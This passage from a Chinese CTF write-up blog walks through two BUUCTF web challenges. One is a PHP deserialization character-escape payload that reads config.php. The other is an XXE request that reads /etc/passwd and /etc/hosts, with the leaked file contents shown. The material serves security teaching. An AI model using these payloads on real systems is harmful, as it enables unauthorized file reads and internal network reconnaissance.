class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^\\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid phone&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid email&apos;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tif(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid nickname&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[&apos;photo&apos;];</span><br><span class=\"line\">\t\tif($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class=\"line\">\t\t\tdie(&apos;Photo size error&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class=\"line\">\t\t$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">\t\techo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class=\"line\">\t\t\t&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Email:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>profile.php</code> 中找到明显的 </p>\n<p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p>\n<p>读取文件内容，而 <code>flag</code> 放在 <code>config.php</code> 文件中，我们要想办法读这个文件。但是上面读文件的参数限定了 <code>photo</code> ，我们在 <code>update.php</code> 中找到有关代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要 <code>POST</code> 四个参数，并且发现 对 <code>nickname</code> 的过滤与前两个不同，可以使用数组绕过。</p>\n<p>然后对<code>$profile</code> 进行序列化并传入过滤函数进行过滤。我们接着看过滤函数</p>\n <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现从 <code>where</code> -&gt; <code>hacker</code> ,长度增加，联想到之前的反序列化字符逃逸。</p>\n<p>我们在本地实验得到序列化后的字符串是(注意已经将nickname改为数组)</p>\n<p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p>\n<p>我们想读的文件是 <code>config.pgp</code> ,也就是要添加<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,长度为34，也就是说我们要追加 34 个 <code>where</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a:4:&#123;s:5:\"</span>phone<span class=\"string\">\";s:11:\"</span><span class=\"number\">12345678901</span><span class=\"string\">\";s:5:\"</span>email<span class=\"string\">\";s:8:\"</span>ss@q.com<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\"&#125;;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;s:39:\"</span>upload/<span class=\"number\">804</span>f743824c0451b2f60d81b63b6a900<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>之后抓包修改 nickname 为数组，将值改为上面我们构造的内容即可。</p>\n<h2 id=\"real\"><a href=\"#real\" class=\"headerlink\" title=\"real\"></a>real</h2><p>12/19/2019 10:32:05 AM </p>\n<h3 id=\"php-xxe\"><a href=\"#php-xxe\" class=\"headerlink\" title=\"php_xxe\"></a>php_xxe</h3><p>libxml2 2.9.4之前版本，parser.c/xmlStringLenDecodeEntities函数存在XML外部实体漏洞，不在验证模式时，可使上下文独立的攻击者读取任意文件或造成拒绝服务。</p>\n<p>web目录./www包含4个文件：</p>\n<pre><code>$ tree .\n.\n├── dom.php # 示例：使用DOMDocument解析body\n├── index.php\n├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body\n└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</code></pre><p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发XXE漏洞</p>\n<p><strong>requests:</strong></p>\n<pre><code>GET /SimpleXMLElement.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nCache-Control: max-age=0\nContent-Length: 163\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>HTTP/1.1 200 OK\nHost: node3.buuoj.cn:26506\nConnection: close\nX-Powered-By: PHP/7.0.30\nContent-type: text/html; charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>还可以进行内网探测：</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n\n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n174.0.56.234    283819a6c89d</code></pre><p>常用的内网 IP 文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n","text":"BUUCTF  wpWEBWarm up查看源码 &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)       ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}]}